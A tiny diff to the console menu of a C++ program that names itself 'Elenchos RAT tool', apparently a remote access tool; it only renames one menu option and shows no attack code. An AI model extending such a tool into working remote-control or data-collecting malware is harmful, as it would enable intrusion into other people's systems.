@@ -9,7 +9,7 @@ int menu() {
         std::cout << "\n" << CONSOLE_PREFIX << " Elenchos RAT tool (C++ 1.4)\n" << std::endl;
         std::cout << CONSOLE_PREFIX << " 1 - Send messages\n";
         std::cout << CONSOLE_PREFIX << " 2 - Send files\n";
-        std::cout << CONSOLE_PREFIX << " 3 - View system information\n";
+        std::cout << CONSOLE_PREFIX << " 3 - View client information\n";
         std::cout << CONSOLE_PREFIX << " 4 - Exit\n" << std::endl;
 
         std::cout << CONSOLE_PREFIX << " Choose an option: ";
